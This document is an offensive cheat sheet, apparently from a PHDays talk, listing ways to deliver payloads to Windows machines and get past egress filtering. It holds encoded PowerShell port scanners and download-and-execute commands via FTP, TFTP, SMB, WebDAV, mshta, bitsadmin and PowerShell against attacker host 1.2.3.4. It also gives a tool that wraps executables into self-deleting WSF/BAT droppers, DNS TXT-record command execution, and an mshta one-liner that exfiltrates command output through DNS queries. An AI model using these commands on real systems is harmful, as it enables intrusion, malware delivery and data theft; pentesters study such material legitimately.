WindowsUploadToolkit # PHDAYS |||
====================

###Agenda
* [Firewall egress filtering](#firewall-egress-filtering)
* [Telnet](#telnet)
* [FTP](#ftp)
* [TFTP](#tftp)
* [SAMBA](#samba)
* [WebDAV](#webdav)
* [MSHTA](#mshta)
* [VBScript\JScript](#vbscriptjscript)
* [Windows Script File](#windows-script-file)
* [NSLOOKUP](#nslookup)
* [PowerShell](#powershell)
* [Bitsadmin](#bitsadmin)

##Firewall egress filtering

### Windows XP & 2003
####Check open TCP:
```
FOR /L %i IN (1,1,4096) DO (cmd /c "start /b telnet 1.2.3.4 %i")
```
####Check open UDP:
```
FOR /L %i IN (1,1,4096) DO (cmd /c "start /b nslookup -port=%i x.com 1.2.3.4")
```

### Windows Vista and Later

####Enable TelnetClient:
```
dism /online /enable-feature /featurename:TelnetClient
```
####Check open TCP:
```
powershell –encodedCommand ZnVuY3Rpb24gc1QoJElQLCRQb3J0KSB7JEFkZHJlc3MgPSBbc3lzdGVtLm5ldC5JUEFkZHJlc3NdOjpQYXJzZSgkSVApOyRFbmQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSVBFbmRQb2ludCAkYWRkcmVzcywgJHBvcnQ7JFNhZGRyZiA9IFtTeXN0ZW0uTmV0LlNvY2tldHMuQWRkcmVzc0ZhbWlseV06OkludGVyTmV0d29yazskU3R5cGUgPSBbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldFR5cGVdOjpTdHJlYW07JFB0eXBlID0gW1N5c3RlbS5OZXQuU29ja2V0cy5Qcm90b2NvbFR5cGVdOjpUQ1A7JFNvY2sgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXQgJHNhZGRyZiwgJHN0eXBlLCAkcHR5cGU7JFNvY2suVFRMID0gMjY7dHJ5IHsgJHNvY2suQ29ubmVjdCgkRW5kKTtbQnl0ZVtdXSAkTWVzc2FnZSA9IFtjaGFyW11dIncwMHR3MDB0IjskU2VudCA9ICRTb2NrLlNlbmQoJE1lc3NhZ2UpOyRzb2NrLkVuZENvbm5lY3QoJENvbm5lY3QpfSBjYXRjaCB7fTskU29jay5DbG9zZSgpO307MS4uNjU1MzUgfCAleyBzVCAtSVAgIjEuMi4zLjQiIC1Qb3J0ICRfIH0=
```

```
function sT($IP,$Port) {
$Address = [system.net.IPAddress]::Parse($IP)
$End = New-Object System.Net.IPEndPoint $address, $port
$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork
$Stype = [System.Net.Sockets.SocketType]::Stream
$Ptype = [System.Net.Sockets.ProtocolType]::TCP
$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype
$Sock.TTL = 26
try { 
  $sock.Connect($End)
  [Byte[]] $Message = [char[]]"w00tw00t“
	$Sent = $Sock.Send($Message)
	$sock.EndConnect($Connect)} catch {}
	$Sock.Close()
}

1..65535 | %{ sT -IP "1.2.3.4" -Port $_ };
```
####Check open UDP:
```
powershell –encodedCommand ZnVuY3Rpb24gc1UoJElQLCBbaW50XSRQb3J0KXskQWRkcmVzcyA9IFtzeXN0ZW0ubmV0LklQQWRkcmVzc106OlBhcnNlKCRJUCk7JEVuZCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50KCRBZGRyZXNzLCAkcG9ydCk7JFNhZGRyZj1bU3lzdGVtLk5ldC5Tb2NrZXRzLkFkZHJlc3NGYW1pbHldOjpJbnRlck5ldHdvcms7JFN0eXBlPVtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0VHlwZV06OkRncmFtOyRQdHlwZT1bU3lzdGVtLk5ldC5Tb2NrZXRzLlByb3RvY29sVHlwZV06OlVEUDskU29jaz1OZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXQgJHNhZGRyZiwgJHN0eXBlLCAkcHR5cGU7JFNvY2suVFRMID0gMjY7JHNvY2suQ29ubmVjdCgkZW5kKTskRW5jPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJOyRNZXNzYWdlID0gIncwMHR3MDB0IjskQnVmZmVyPSRFbmMuR2V0Qnl0ZXMoJE1lc3NhZ2UpOyRTZW50PSRTb2NrLlNlbmQoJEJ1ZmZlcik7fTsgMS4uNjU1MzUgfCAleyBzVSAtSVAgIjEuMi4zLjQiIC1Qb3J0ICRfIH0=
```
```
function sU($IP, [int]$Port){
$Address = [system.net.IPAddress]::Parse($IP)
$End = New-Object System.Net.IPEndPoint($Address, $port)
$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork
$Stype = [System.Net.Sockets.SocketType]::Dgram
$Ptype = [System.Net.Sockets.ProtocolType]::UDP
$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype
$Sock.TTL = 26
$sock.Connect($end)
$Enc = [System.Text.Encoding]::ASCII
$Message = "w00tw00t“
$Buffer = $Enc.GetBytes($Message)
$Sent = $Sock.Send($Buffer)
}

1..65535 | %{ sU -IP "1.2.3.4" -Port $_ }
```


##Telnet
####Server side
```
nc -q 20 -lvp 53 < payload.vbs
```
####Client side
```
mode CON COLS=2000 && telnet -f c:\payload.vbs 1.2.3.4 53
```

##FTP
####Server side
Start anonymous FTP
####Client side
Script file payload.txt:
```
open 1.2.3.4 3128
quote pasv
binary
get payload.exe c:\payload.exe
bye
```
```
ftp -i -s:payload.txt
```
##TFTP
####Server Side
```
atftpd --daemon --port 69 /tmp
```
####Client side
```
tftp –i 1.2.3.4 GET payload.exe
```
##Samba
####Server Side
```
service smbd start
```
####Client side
```
net use X: \\1.2.3.4\
```
```
copy x:\payload.exe c:\payload.exe
```
##WebDAV
####Server Side
Enable Apache WebDAV module
####Client side
```
net use X: http://1.2.3.4/webdav
```
```
net use X: \\1.2.3.4\webdav
```
```
net use X: \\1.2.3.4@SSL\webdav
```
```
net use X: \\1.2.3.4@SSL@5443\webdav
```
```
net use X: \\1.2.3.4@53\webdav
```

##VBScript/JScript
####Server Side
```
nc -q 20 -lvp 53 < payload.js
```
####Client side
```
telnet –f payload.js 1.2.3.4  53
cscript payload.js
```
```
cscript \\1.2.3.4\payload.js
```

##Windows Script File
####Server Side
Convert any file to BAT or WSF:
* Make-CabFile -Path "c:\payload.exe" | Convert-Cab2WSF -OutFile "c:\payload.wsf"
* Make-CabFile -Path "c:\payload.exe" | Convert-Cab2Bat -OutFile "c:\payload.bat"

Copy to Clipboard!
* Make-CabFile -Path "c:\payload.exe" | Convert-Cab2WSF | clip
* Make-CabFile -Path "c:\payload.exe" | Convert-Cab2Bat | clip

```
function Cab-Base64 {
	param (
                [string]$Path = "$(throw 'Path is a mandatory parameter.')"
        )
	$xml = new-object -comobject Microsoft.XMLDOM
	$cab = $xml.createElement("cab")
	$cab.dataType = "bin.base64"
	$cab.nodeTypedValue = [byte[]](Get-Content -Path $Path -Encoding Byte)
	$CabBase64 = $cab.text.toString()
	invoke-expression -command "del $Path" | Out-Null
	return $CabBase64
}

function Make-CabFile {
	param (
                [string]$Path = "$(throw 'Path is a mandatory parameter.')"
        )
	if (-not(Test-Path -Path $Path)) { Write-Error "File $path not found!"; return }
	$cab_path = (Split-Path $Path -Parent) + "\file.cab"
	invoke-expression -command "makecab.exe $Path $cab_path" | Out-Null
	return Cab-Base64 -path $cab_path
}

function Convert-Cab2WSF {
	  param(  
	    [Parameter(
    	    Position=0, 
        	Mandatory=$true, 
        	ValueFromPipeline=$true)
    	]
    	[String]$CabBase64, [String]$OutFile = $nil
    	) 

	$template = @()
	$template += '<package><cab xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="bin.base64">'
	$CabBase64.split("`n") | %{ $template += $_ }
	$template += '</cab><job><script language="VBScript">'
	$template += 'Set xml = CreateObject("Microsoft.XMLDOM")'
	$template += 'xml.load WScript.ScriptFullName'
	$template += 'Set stm = CreateObject("ADODB.Stream")'
	$template += 'stm.Open : stm.Type = 1'
	$template += 'stm.Write xml.documentElement.childNodes.item(0).nodeTypedValue'
	$template += 'stm.SaveToFile "payload.cab"'
	$template += 'stm.close'
	$template += 'Set stm = nothing'
	$template += 'Set WshShell = CreateObject("WScript.Shell")'
	$template += 'Set objFSO = CreateObject("Scripting.FileSystemObject")'
	$template += 'Set objFile = objFSO.GetFile(WScript.ScriptFullName)'
	$template += 'WshShell.Run "cmd /c expand.exe -r payload.cab"'
	$template += '</script></job></package>'
	
	if ($OutFile -eq "") {
	 	return $template -join "`r`n"
	} else {
		Out-File -Encoding ASCII -InputObject ($template -join "`r`n") -FilePath $OutFile
	}
}

function Convert-Cab2Bat {

	  param(  
	    [Parameter(
    	    Position=0, 
        	Mandatory=$true, 
        	ValueFromPipeline=$true)
    	]
    	[String]$CabBase64, [String]$OutFile = ""
    	) 

	 $template = @()
	 $template += '@echo ^<package^>^<cab xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="bin.base64"^> >payload'
	 $CabBase64.split("`n") | %{ $template += '@echo ' + $_ + '>>payload' }
	 $template += '@echo ^</cab^>^<job^>^<script language="VBScript"^> >>payload'
	 $template += '@echo Set xml = CreateObject("Microsoft.XMLDOM")>>payload'
	 $template += '@echo xml.load WScript.ScriptFullName >>payload'
	 $template += '@echo Set stm = CreateObject("ADODB.Stream")>>payload'
	 $template += '@echo stm.Open : stm.Type = 1 >>payload'
	 $template += '@echo stm.Write xml.documentElement.childNodes.item(0).nodeTypedValue>>payload'
	 $template += '@echo stm.SaveToFile "payload.cab">>payload'
	 $template += '@echo ^</script^>^</job^>^</package^> >>payload'
	 $template += 'rename payload payload.wsf'
	 $template += 'cscript.exe //nologo payload.wsf'
	 $template += 'expand.exe -r payload.cab>nul'
	 $template += 'del payload.wsf payload.cab payload.bat>nul'

	if ($OutFile -eq "") {
	 	return $template -join "`r`n"
	} else {
		Out-File -Encoding ASCII -InputObject ($template -join "`r`n") -FilePath $OutFile
	}
	
}
```
####Client side
Save file as payload.wsf
```xml
<job><script language="VBScript" src="http://1.2.3.4:80/payload.vbs"></script></job>
```
```xml
<job><script language="VBScript" src=“ftp://1.2.3.4:21/payload.vbs"></script></job>
```
```xml
<job><script language="VBScript" src=“\\1.2.3.4\payload.vbs"></script></job>
```
```
cscript payload.wsf
```

##MSHTA
####Server Side
####Client side
```
mshta http(s)://pastebin.com:80/raw.php?i=5W6JtsUu
```
```
mshta ftp://1.2.3.4:21/payload.jpg
```
```
mshta \\1.2.3.4\payload.js
```
Execute inline
```
mshta vbscript:Execute("WScript.Echo 1")
```
```
mshta javascript:Execute("WScript.Echo(1);")
```

##NSLOOKUP
####Server Side
Create TXT record:
```
TXT = \1x“ & echo dir \”c:\\Program Files\” >> p.bat & \”
```
####Client side
```
nslookup –type=TXT rce.pentest.com > run.bat & run.bat
```
Send output:
```javascript
mshta "javascript:function h(out){hxd='';for(a=0;a<out.length;a=a+1){hxd=hxd+out.charCodeAt(a).toString(16);}return hxd;}function r(cmd){var shell=new ActiveXObject('WScript.Shell');var se=shell.Exec(cmd);var out = '';while(!(se.StdOut.AtEndOfStream)){out=out+se.StdOut.ReadLine();}return out;}function ex(cmd){var out=h(r(cmd));query=out.match(/.{1,60}/g);for(v=0;v<query.length;v=v+1){r('nslookup '+v+'x'+query[v]+'.pentest.com')};}function e(){ex('dir');}window.onload=e"
```
##PowerShell
####Client side
```
(New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4:80/payload.exe", "c:\payload.exe")
```

##Bitsadmin
####Client side
```
bitsadmin /transfer whatever http://1.2.3.4:80/payload.exe c:\payload.exe
```
```
bitsadmin /CREATE /DOWNLOAD jobname
bitsadmin /ADDFILE jobname http://1.2.3.4/payload1.exe p1.exe
bitsadmin /ADDFILE jobname http://1.2.3.4/payload2.exe p2.exe
bitsadmin /RESUME jobname
bitsadmin /COMPLETE jobname
```
